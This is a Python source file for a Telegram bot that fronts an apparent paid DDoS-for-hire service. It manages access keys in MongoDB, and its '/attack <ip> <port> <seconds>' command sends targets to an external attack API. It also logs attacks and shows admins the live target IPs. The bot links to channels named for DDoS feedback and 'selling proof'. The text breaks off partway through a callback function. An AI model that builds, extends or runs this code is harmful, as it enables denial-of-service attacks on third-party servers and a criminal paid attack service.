import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import re
from functools import wraps
import uuid, os, secrets, string, time
from dotenv import load_dotenv

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
load_dotenv()

BOT_TOKEN        = os.getenv("BOT_TOKEN")
MONGODB_URI      = os.getenv("MONGODB_URI", "mongodb://localhost:27017/")
DATABASE_NAME    = os.getenv("DATABASE_NAME", "attack_bot")
API_URL          = os.getenv("API_URL")
API_KEY          = os.getenv("API_KEY")
ADMIN_IDS        = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
CHANNEL_ID       = os.getenv("CHANNEL_ID", "")
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "")
CHANNEL_INVITE   = os.getenv("CHANNEL_INVITE_LINK", "")

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
IST = timezone(timedelta(hours=5, minutes=30))
active_attacks: dict = {}  # Will store: {uid: {"end": timestamp, "ip": ip, "port": port, "start_time": timestamp}}

def utc_now():
    return datetime.now(timezone.utc)

def to_ist(dt):
    if dt is None: return None
    if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(IST)

def fmt_ist(dt):
    if dt is None: return "N/A"
    return to_ist(dt).strftime("%d %b %Y, %I:%M %p IST")

def days_left(dt):
    if dt is None: return 0
    if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
    return max(0, (dt - utc_now()).days)

def gen_key(hours, uses):
    rand = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
    return f"KEY-{rand}-{hours}H-{uses}U"

def join_url():
    if CHANNEL_INVITE: return CHANNEL_INVITE
    if CHANNEL_USERNAME: return f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"
    return ""

def get_support_keyboard():
    """Create keyboard with support and channel buttons"""
    keyboard = [
        [InlineKeyboardButton("👑 Contact Owner", url="https://t.me/BattleDestroyerOwner")],
        [InlineKeyboardButton("📢 Feedback Channel", url="https://t.me/BDDdosFeedback")],
        [InlineKeyboardButton("💰 Selling Proof", url="https://t.me/BDSellingProof")],
    ]
    return InlineKeyboardMarkup(keyboard)

def join_keyboard():
    kb = []
    url = join_url()
    if url: kb.append([InlineKeyboardButton("📢 Join Channel", url=url)])
    kb.append([InlineKeyboardButton("✅ I've Joined – Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(kb)

class DB:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        d = self.client[DATABASE_NAME]
        self.users   = d.users
        self.attacks = d.attacks
        self.keys    = d.keys
        self._indexes()

    def _indexes(self):
        try:
            info = self.users.index_information()
            if "user_id_1" in info:
                self.users.drop_index("user_id_1")
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.attacks.create_index([("user_id", ASCENDING)])
            self.keys.create_index([("key", ASCENDING)], unique=True)
            self.keys.create_index([("is_active", ASCENDING)])
        except Exception as e:
            logger.error(f"Index error: {e}")

    def get_user(self, uid):
        return self.users.find_one({"user_id": uid})

    def upsert_user(self, uid, username=None, first_name=None):
        user = self.get_user(uid)
        if user: return user
        doc = {
            "user_id": uid, "username": username, "first_name": first_name,
            "approved": False, "expires_at": None, "total_attacks": 0,
            "created_at": utc_now(), "joined_channel": False,
            "redeemed_keys": []
        }
        try:
            self.users.insert_one(doc)
        except pymongo.errors.DuplicateKeyError:
            doc = self.get_user(uid)
        return doc

    def is_approved(self, uid):
        u = self.get_user(uid)
        if not u or not u.get("approved"): return False
        exp = u.get("expires_at")
        if exp:
            if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
            if exp < utc_now(): return False
        return True

    def set_channel_status(self, uid, joined):
        self.users.update_one({"user_id": uid}, {"$set": {"joined_channel": joined}})

    def approve(self, uid, hours):
        exp = utc_now() + timedelta(hours=hours)
        user = self.get_user(uid)
        if user and user.get("approved") and user.get("expires_at"):
            old_exp = user["expires_at"]
            if old_exp.tzinfo is None: old_exp = old_exp.replace(tzinfo=timezone.utc)
            if old_exp > utc_now():
                exp = old_exp + timedelta(hours=hours)
        
        self.users.update_one(
            {"user_id": uid},
            {"$set": {"approved": True, "expires_at": exp}},
            upsert=True
        )
        return exp

    def all_users(self):
        return list(self.users.find())

    def create_key(self, hours, uses, by):
        key = gen_key(hours, uses)
        exp = utc_now() + timedelta(hours=hours)
        doc = {
            "key": key, "hours": hours, "max_uses": uses,
            "used_count": 0, "users_used": [],
            "created_by": by, "created_at": utc_now(),
            "expires_at": exp, "is_active": True
        }
        self.keys.insert_one(doc)
        return doc

    def redeem_key(self, key, uid):
        kd = self.keys.find_one({"key": key, "is_active": True})
        if not kd:
            return {"ok": False, "err": "❌ Invalid or expired key."}
        exp = kd["expires_at"]
        if exp.tzinfo is None: exp = exp.replace(tzinfo=timezone.utc)
        if exp < utc_now():
            return {"ok": False, "err": "❌ This key has expired."}
        
        if uid in kd.get("users_used", []):
            return {"ok": False, "err": "❌ You already redeemed this key."}
        
        if kd["used_count"] >= kd["max_uses"]:
            return {"ok": False, "err": "❌ Key has reached its maximum uses."}
        
        new_exp = self.approve(uid, kd["hours"])
        
        self.users.update_one(
            {"user_id": uid},
            {"$push": {"redeemed_keys": key}}
        )
        
        self.keys.update_one(
            {"_id": kd["_id"]},
            {"$inc": {"used_count": 1}, "$push": {"users_used": uid}}
        )
        return {"ok": True, "hours": kd["hours"], "expires_at": new_exp}

    def list_keys(self, active_only=True):
        q = {"is_active": True} if active_only else {}
        return list(self.keys.find(q).sort("created_at", -1))

    def deactivate_key(self, key):
        r = self.keys.update_one({"key": key}, {"$set": {"is_active": False}})
        return r.modified_count > 0
    
    def delete_all_keys(self):
        result = self.keys.delete_many({})
        return result.deleted_count
    
    def delete_keys_by_hours(self, hours):
        result = self.keys.delete_many({"hours": hours})
        return result.deleted_count
    
    def delete_used_keys(self):
        result = self.keys.delete_many({"used_count": {"$gt": 0}})
        return result.deleted_count
    
    def delete_unused_keys(self):
        result = self.keys.delete_many({"used_count": 0})
        return result.deleted_count

    def log_attack(self, uid, ip, port, dur, status):
        self.attacks.insert_one({
            "_id": str(uuid.uuid4()), "user_id": uid,
            "ip": ip, "port": port, "duration": dur,
            "status": status, "timestamp": utc_now()
        })
        self.users.update_one({"user_id": uid}, {"$inc": {"total_attacks": 1}})

    def user_stats(self, uid):
        total   = self.attacks.count_documents({"user_id": uid})
        success = self.attacks.count_documents({"user_id": uid, "status": "success"})
        recent  = list(self.attacks.find({"user_id": uid}).sort("timestamp", -1).limit(5))
        return {"total": total, "success": success, "failed": total - success, "recent": recent}
    
    def get_attack_logs(self, limit=50):
        return list(self.attacks.find().sort("timestamp", -1).limit(limit))
    
    def get_user_redeemed_keys(self, uid):
        user = self.get_user(uid)
        return user.get("redeemed_keys", []) if user else []

def launch_api(ip, port, dur):
    try:
        r = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": dur},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return r.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

def admin_only(fn):
    @wraps(fn)
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE, *a, **kw):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admins only.")
            return
        return await fn(update, ctx, *a, **kw)
    return wrapper

async def check_joined(uid, ctx):
    if not CHANNEL_ID: return True
    try:
        m = await ctx.bot.get_chat_member(chat_id=int(CHANNEL_ID), user_id=uid)
        joined = m.status in ("member", "administrator", "creator")
        db.set_channel_status(uid, joined)
        return joined
    except Exception as e:
        logger.error(f"Channel check: {e}")
        return False

# ===== ADMIN COMMANDS =====
@admin_only
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            "Usage: `/genkey <hours> [uses]`\n\n"
            "Examples:\n"
            "`/genkey 24`     — 24h, 1 use\n"
            "`/genkey 48 10`  — 48h, 10 uses\n"
            "`/genkey 720 1`  — 30 days, 1 use",
            parse_mode="Markdown"
        )
        return
    try:
        hours = int(ctx.args[0])
        uses  = int(ctx.args[1]) if len(ctx.args) > 1 else 1
        if hours <= 0 or uses <= 0: raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Hours and uses must be positive numbers.")
        return
    kd = db.create_key(hours, uses, update.effective_user.id)
    await update.message.reply_text(
        f"🔑 *Key Generated*\n\n"
        f"`{kd['key']}`\n\n"
        f"⏱ Duration : {hours}h ({hours/24:.1f} days)\n"
        f"👥 Max Uses : {uses}\n"
        f"📅 Expires  : {fmt_ist(kd['expires_at'])}\n\n"
        f"Share → `/redeem {kd['key']}`",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_keys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keys = db.list_keys(active_only=False)
    if not keys:
        await update.message.reply_text("No keys found.", reply_markup=get_support_keyboard())
        return
    lines = []
    for k in keys[:20]:
        icon  = "✅" if k["is_active"] else "❌"
        short = k["key"][:22] + "…"
        lines.append(f"{icon} `{short}` — {k['hours']}h — {k['used_count']}/{k['max_uses']} uses")
    active = sum(1 for k in keys if k["is_active"])
    await update.message.reply_text(
        f"🔑 *Keys* — Total: {len(keys)} | Active: {active}\n\n" + "\n".join(lines),
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_delkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            "Usage: `/delkey <key>` - Delete a single key\n\n"
            "Other key deletion commands:\n"
            "`/delkeyall` - Delete ALL keys from database\n"
            "`/delusedkeys` - Delete only used keys\n"
            "`/delunusedkeys` - Delete only unused keys\n"
            "`/delkeysbyhours <hours>` - Delete keys with specific hours",
            parse_mode="Markdown"
        )
        return
    if db.deactivate_key(ctx.args[0]):
        await update.message.reply_text("✅ Key deactivated.", reply_markup=get_support_keyboard())
    else:
        await update.message.reply_text("❌ Key not found.", reply_markup=get_support_keyboard())

@admin_only
async def cmd_delkeyall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ YES, Delete ALL Keys", callback_data="confirm_delall"),
            InlineKeyboardButton("❌ NO, Cancel", callback_data="cancel_delall")
        ]
    ])
    
    key_count = db.keys.count_documents({})
    await update.message.reply_text(
        f"⚠️ *WARNING: Delete ALL Keys*\n\n"
        f"You are about to delete **{key_count}** keys from the database.\n\n"
        f"⚠️ This action is IRREVERSIBLE!\n"
        f"✅ User accounts already redeemed with these keys will NOT be affected.\n"
        f"❌ These keys cannot be used again.\n\n"
        f"Are you sure?",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@admin_only
async def cmd_delusedkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    count = db.delete_used_keys()
    await update.message.reply_text(
        f"✅ Deleted **{count}** used keys from database.\n\n"
        f"ℹ️ Users who redeemed these keys keep their access.",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_delunusedkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    count = db.delete_unused_keys()
    await update.message.reply_text(
        f"✅ Deleted **{count}** unused keys from database.",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_delkeysbyhours(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            "Usage: `/delkeysbyhours <hours>`\n\n"
            "Example: `/delkeysbyhours 24` - Delete all 24-hour keys",
            parse_mode="Markdown"
        )
        return
    
    try:
        hours = int(ctx.args[0])
        if hours <= 0: raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Hours must be a positive number.")
        return
    
    count = db.delete_keys_by_hours(hours)
    await update.message.reply_text(
        f"✅ Deleted **{count}** keys with {hours} hours duration.",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = db.all_users()
    if not users:
        await update.message.reply_text("No users yet.", reply_markup=get_support_keyboard())
        return
    approved  = sum(1 for u in users if db.is_approved(u["user_id"]))
    total_atk = sum(u.get("total_attacks", 0) for u in users)
    lines = []
    for u in users[:20]:
        uid    = u["user_id"]
        status = "✅" if db.is_approved(uid) else "❌"
        ch     = "📢" if u.get("joined_channel") else "🚫"
        exp    = u.get("expires_at")
        keys_count = len(u.get("redeemed_keys", []))
        lines.append(f"{ch}{status} `{uid}` — {u.get('total_attacks',0)} atk | {keys_count} keys — {fmt_ist(exp)}")
    await update.message.reply_text(
        f"👥 *Users* — {len(users)} total | {approved} approved | {total_atk} attacks\n\n" + "\n".join(lines),
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    msg   = " ".join(ctx.args)
    users = db.all_users()
    sent  = 0
    info  = await update.message.reply_text(f"📡 Sending to {len(users)} users…")
    for u in users:
        try:
            await ctx.bot.send_message(u["user_id"], f"📢 *Announcement*\n\n{msg}", parse_mode="Markdown", reply_markup=get_support_keyboard())
            sent += 1
            await asyncio.sleep(0.05)
        except: pass
    await info.edit_text(f"✅ Sent to {sent}/{len(users)} users.")

@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users    = db.all_users()
    approved = sum(1 for u in users if db.is_approved(u["user_id"]))
    total    = sum(u.get("total_attacks", 0) for u in users)
    ch_join  = sum(1 for u in users if u.get("joined_channel"))
    keys     = db.list_keys()
    total_keys = db.keys.count_documents({})
    used_keys = db.keys.count_documents({"used_count": {"$gt": 0}})
    await update.message.reply_text(
        f"📊 *Bot Stats*\n\n"
        f"👥 Users      : {len(users)}\n"
        f"✅ Approved   : {approved}\n"
        f"📢 Ch Joined  : {ch_join}\n"
        f"🎯 Attacks    : {total}\n"
        f"🔑 Total Keys : {total_keys}\n"
        f"📌 Used Keys  : {used_keys}\n"
        f"✨ Active Keys: {len(keys)}\n"
        f"🚫 Blk Ports  : {len(BLOCKED_PORTS)}",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_curlip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin command to see currently attacking users and their target IPs"""
    if not active_attacks:
        await update.message.reply_text(
            "📭 No active attacks running.\n\n"
            "💡 Active attacks will appear here when users launch attacks.",
            reply_markup=get_support_keyboard()
        )
        return
    
    active_info = []
    current_time = time.time()
    
    for uid, attack_data in list(active_attacks.items()):
        remaining = int(attack_data["end"] - current_time)
        if remaining > 0:
            user = db.get_user(uid)
            username = user.get('username', 'N/A') if user else 'N/A'
            first_name = user.get('first_name', 'Unknown') if user else 'Unknown'
            
            active_info.append(
                f"👤 *User:* `{uid}`\n"
                f"   📛 Name: {first_name} (@{username})\n"
                f"   🎯 Target IP: `{attack_data['ip']}:{attack_data['port']}`\n"
                f"   ⏱ Remaining: {remaining}s\n"
                f"   ⏰ Started: {fmt_ist(datetime.fromtimestamp(attack_data['start_time'], tz=timezone.utc))}\n"
                f"{'─' * 35}"
            )
    
    if active_info:
        text = "🔥 *CURRENT ACTIVE ATTACKS*\n\n"
        text += f"📊 Total active: {len(active_info)}\n\n"
        text += "\n".join(active_info)
        text += f"\n\n📝 *Note:* IP addresses are visible only to admins"
    else:
        text = "📭 No active attacks with remaining time."
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_serverip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin command to see server IP address"""
    try:
        # Get public IP of the server
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        server_ip = response.json().get("ip", "Unknown")
        
        # Also get location info
        ip_info = requests.get(f"http://ip-api.com/json/{server_ip}", timeout=5).json()
        
        text = f"🖥️ *Server Information*\n\n"
        text += f"🌐 Public IP: `{server_ip}`\n"
        text += f"📍 Location: {ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}\n"
        text += f"🏢 ISP: {ip_info.get('isp', 'Unknown')}\n"
        text += f"📡 Hosting: {ip_info.get('org', 'Unknown')}"
        
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Could not fetch server IP: {e}", reply_markup=get_support_keyboard())

@admin_only
async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin command to see recent attack logs"""
    logs = db.get_attack_logs(20)
    if not logs:
        await update.message.reply_text("📭 No attack logs found.", reply_markup=get_support_keyboard())
        return
    
    lines = []
    for log in logs[:20]:
        user = db.get_user(log['user_id'])
        username = user.get('username', 'N/A') if user else 'N/A'
        status_icon = "✅" if log['status'] == "success" else "❌"
        lines.append(
            f"{status_icon} `{log['ip']}:{log['port']}` | {log['duration']}s\n"
            f"   👤 `{log['user_id']}` (@{username}) | {fmt_ist(log['timestamp'])}"
        )
    
    text = "📋 *Recent Attack Logs*\n\n" + "\n\n".join(lines)
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_mykeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin command to see which keys a user has redeemed"""
    if not ctx.args:
        await update.message.reply_text(
            "Usage: `/mykeys <user_id>`\n\n"
            "Example: `/mykeys 123456789` - Show keys redeemed by user",
            parse_mode="Markdown"
        )
        return
    
    try:
        target_uid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return
    
    user = db.get_user(target_uid)
    if not user:
        await update.message.reply_text(f"❌ User `{target_uid}` not found.", parse_mode="Markdown")
        return
    
    redeemed_keys = user.get("redeemed_keys", [])
    if not redeemed_keys:
        await update.message.reply_text(
            f"👤 User `{target_uid}` has not redeemed any keys yet.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    keys_text = "\n".join([f"• `{key}`" for key in redeemed_keys[-20:]])  # Show last 20
    remaining = len(redeemed_keys) - 20 if len(redeemed_keys) > 20 else 0
    
    text = f"👤 *User Keys*\n\n"
    text += f"User: `{target_uid}`\n"
    text += f"Keys redeemed: {len(redeemed_keys)}\n\n"
    text += f"{keys_text}"
    if remaining > 0:
        text += f"\n\n... and {remaining} more"
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

# ===== USER COMMANDS =====
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.username
    fname = update.effective_user.first_name or uname or str(uid)
    db.upsert_user(uid, uname, fname)

    if CHANNEL_ID and not await check_joined(uid, ctx):
        await update.message.reply_text(
            f"👋 Hello *{fname}*!\n\n"
            f"📢 Join our channel to use this bot.\n\n"
            f"1️⃣ Tap *Join Channel*\n"
            f"2️⃣ Tap *I've Joined – Verify*",
            parse_mode="Markdown",
            reply_markup=join_keyboard()
        )
        return

    if db.is_approved(uid):
        u   = db.get_user(uid)
        exp = u.get("expires_at")
        redeemed_count = len(u.get("redeemed_keys", []))
        await update.message.reply_text(
            f"✅ *Welcome back, {fname}!*\n\n"
            f"📅 Expires   : {fmt_ist(exp)}\n"
            f"⏳ Days left : {days_left(exp)} days\n"
            f"🔑 Keys used : {redeemed_count}\n\n"
            f"Use `/attack <ip> <port> <seconds>` to start.\n"
            f"Max duration: 80 seconds\n\n"
            f"💡 You can redeem multiple keys to extend your access!",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await update.message.reply_text(
            f"👋 Hello *{fname}*!\n\n"
            f"❌ Account *not active*.\n\n"
            f"🔑 Use `/redeem <key>` to activate.\n"
            f"📩 Or contact admin for a key.\n\n"
            f"💡 You can redeem multiple keys to get more time!",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if CHANNEL_ID and not await check_joined(uid, ctx):
        await update.message.reply_text("❌ Join our channel first.\nUse `/start` to get the link.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`\n\n💡 You can redeem multiple keys to extend your access!", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    key = ctx.args[0].strip()
    
    user = db.get_user(uid)
    if user and key in user.get("redeemed_keys", []):
        await update.message.reply_text(
            f"❌ You have already redeemed this key!\n\n"
            f"💡 You can redeem DIFFERENT keys to extend your access.\n"
            f"Use `/myredeemed` to see your redeemed keys.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    result = db.redeem_key(key, uid)
    if result["ok"]:
        h   = result["hours"]
        exp = result["expires_at"]
        user = db.get_user(uid)
        redeemed_count = len(user.get("redeemed_keys", []))
        await update.message.reply_text(
            f"🎉 *Key Redeemed!*\n\n"
            f"⏱ Duration added : {h}h ({h/24:.1f} days)\n"
            f"📅 New expiry     : {fmt_ist(exp)}\n"
            f"⏳ Days left      : {days_left(exp)} days\n"
            f"🔑 Total keys used: {redeemed_count}\n\n"
            f"✅ Use `/attack <ip> <port> <seconds>` to start!\n"
            f"Max duration: 80 seconds\n\n"
            f"💡 You can redeem more keys to extend further!",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await update.message.reply_text(result["err"], reply_markup=get_support_keyboard())

async def cmd_myinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = db.get_user(uid)
    if not u:
        await update.message.reply_text("❌ Not registered. Use /start.", reply_markup=get_support_keyboard())
        return
    exp    = u.get("expires_at")
    status = "✅ Active" if db.is_approved(uid) else "❌ Inactive"
    ch     = "✅ Joined" if u.get("joined_channel") else "❌ Not joined"
    redeemed_count = len(u.get("redeemed_keys", []))
    await update.message.reply_text(
        f"📋 *Your Account*\n\n"
        f"🆔 ID        : `{uid}`\n"
        f"📌 Status    : {status}\n"
        f"📅 Expires   : {fmt_ist(exp)}\n"
        f"⏳ Days left : {days_left(exp)} days\n"
        f"🎯 Attacks   : {u.get('total_attacks', 0)}\n"
        f"🔑 Keys used : {redeemed_count}\n"
        f"📢 Channel   : {ch}",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

async def cmd_myredeemed(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = db.get_user(uid)
    
    if not user:
        await update.message.reply_text("❌ Not registered. Use /start.", reply_markup=get_support_keyboard())
        return
    
    redeemed_keys = user.get("redeemed_keys", [])
    if not redeemed_keys:
        await update.message.reply_text(
            f"📭 You haven't redeemed any keys yet.\n\n"
            f"Use `/redeem <key>` to activate your account.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    recent_keys = redeemed_keys[-10:]
    keys_text = "\n".join([f"• `{key}`" for key in recent_keys])
    remaining = len(redeemed_keys) - 10 if len(redeemed_keys) > 10 else 0
    
    text = f"🔑 *Your Redeemed Keys*\n\n"
    text += f"Total keys used: {len(redeemed_keys)}\n\n"
    text += f"*Recent keys:*\n{keys_text}"
    if remaining > 0:
        text += f"\n\n... and {remaining} more"
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

async def cmd_mystats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not db.is_approved(uid):
        await update.message.reply_text("❌ Not approved. Use `/redeem <key>`.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    s    = db.user_stats(uid)
    rate = (s["success"] / s["total"] * 100) if s["total"] > 0 else 0
    text = (
        f"📊 *Your Stats*\n\n"
        f"🎯 Total   : {s['total']}\n"
        f"✅ Success : {s['success']}\n"
        f"❌ Failed  : {s['failed']}\n"
        f"📈 Rate    : {rate:.1f}%\n"
    )
    if s["recent"]:
        text += "\n*Recent:*\n"
        for a in s["recent"]:
            icon = "✅" if a["status"] == "success" else "❌"
            ip_parts = a["ip"].split('.')
            masked_ip = f"{ip_parts[0]}.{ip_parts[1]}.xxx.xxx" if len(ip_parts) == 4 else a["ip"]
            text += f"{icon} `{masked_ip}:{a['port']}` — {a['duration']}s\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if CHANNEL_ID and not await check_joined(uid, ctx):
        await update.message.reply_text("❌ Join our channel first.\nUse `/start` to get the link.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    if not db.is_approved(uid):
        await update.message.reply_text("❌ *Not Active*\n\nUse `/redeem <key>` to activate.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    if uid in active_attacks and active_attacks[uid]["end"] > time.time():
        left = int(active_attacks[uid]["end"] - time.time())
        await update.message.reply_text(f"⏳ Attack running. Wait {left}s.", reply_markup=get_support_keyboard())
        return
    if len(ctx.args) != 3:
        blocked = ", ".join(str(p) for p in sorted(BLOCKED_PORTS))
        await update.message.reply_text(
            f"Usage: `/attack <ip> <port> <seconds>`\n\n"
            f"Example: `/attack 1.2.3.4 80 60`\n"
            f"Max: 80 seconds | Blocked ports: {blocked}",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    ip = ctx.args[0]
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP address.", reply_markup=get_support_keyboard())
        return
    try:
        port = int(ctx.args[1])
        assert 1 <= port <= 65535
    except:
        await update.message.reply_text("❌ Invalid port (1–65535).", reply_markup=get_support_keyboard())
        return
    if port in BLOCKED_PORTS:
        await update.message.reply_text(f"❌ Port {port} is blocked.", reply_markup=get_support_keyboard())
        return
    try:
        dur = int(ctx.args[2])
        assert 1 <= dur <= 80
    except:
        await update.message.reply_text("❌ Duration must be 1–80 seconds.", reply_markup=get_support_keyboard())
        return

    msg = await update.message.reply_text(
        f"🚀 *Launching…*\n\n🎯 Target: `{ip}:{port}`\n⏱ Duration: {dur}s",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )
    
    # Store attack info with start time
    active_attacks[uid] = {
        "end": time.time() + dur,
        "ip": ip,
        "port": port,
        "start_time": time.time()
    }
    
    resp = launch_api(ip, port, dur)

    if resp.get("success"):
        step = max(1, dur // 10)
        for remaining in range(dur, 0, -step):
            pct = int((dur - remaining) / dur * 100)
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            try:
                await msg.edit_text(
                    f"⚡ *Attack Running*\n\n"
                    f"🎯 Target   : `{ip}:{port}`\n"
                    f"⏳ Remaining: {remaining}s\n\n"
                    f"`[{bar}]` {pct}%",
                    parse_mode="Markdown",
                    reply_markup=get_support_keyboard()
                )
            except Exception as e:
                if "not modified" not in str(e).lower(): break
            await asyncio.sleep(min(step, remaining))
        try:
            await msg.edit_text(
                f"✅ *Attack Complete!*\n\n"
                f"🎯 Target  : `{ip}:{port}`\n"
                f"⏱ Duration: {dur}s\n"
                f"🕐 Time    : {fmt_ist(utc_now())}",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
        except: pass
        db.log_attack(uid, ip, port, dur, "success")
    else:
        err = resp.get("error", "Unknown error")
        try:
            await msg.edit_text(f"❌ *Attack Failed*\n\nError: {err}", parse_mode="Markdown", reply_markup=get_support_keyboard())
        except: pass
        db.log_attack(uid, ip, port, dur, "failed")

    active_attacks.pop(uid, None)

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    is_admin = uid in ADMIN_IDS
    approved = db.is_approved(uid)
    text = "🤖 *Bot Commands*\n\n"
    text += "`/start`           — Status & welcome\n"
    text += "`/redeem <key>`    — Activate/extend account\n"
    text += "`/myinfo`          — Account details\n"
    text += "`/myredeemed`      — View your redeemed keys\n"
    if approved:
        text += "`/attack ip port s` — Launch attack (max 80s)\n"
        text += "`/mystats`         — Attack history\n"
    if is_admin:
        text += "\n👑 *Admin Commands:*\n"
        text += "`/genkey <h> [uses]`    — Create key\n"
        text += "`/keys`                 — List keys\n"
        text += "`/delkey <key>`         — Delete single key\n"
        text += "`/delkeyall`            — DELETE ALL keys\n"
        text += "`/delusedkeys`          — Delete used keys\n"
        text += "`/delunusedkeys`        — Delete unused keys\n"
        text += "`/delkeysbyhours <h>`   — Delete keys by duration\n"
        text += "`/users`                — List all users\n"
        text += "`/mykeys <user_id>`     — Show user's keys\n"
        text += "`/broadcast <msg>`      — Announcement\n"
        text += "`/stats`                — Bot statistics\n"
        text += "`/curlip`               — Current active attacks (shows IPs)\n"
        text += "`/serverip`             — Show server IP address\n"
        text += "`/logs`                 — Attack logs\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

async def cb_verify(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    if await check_joined(uid, ctx):
        try:
            await query.edit_message_text(
                "✅ *Verified!*\n\nUse `/start` to continue.",
                parse_mode="Markdown"
            )
        except Exception as e:
            if "not modified" not in str(e).lower(): logger.error(e)
    else:
        try:
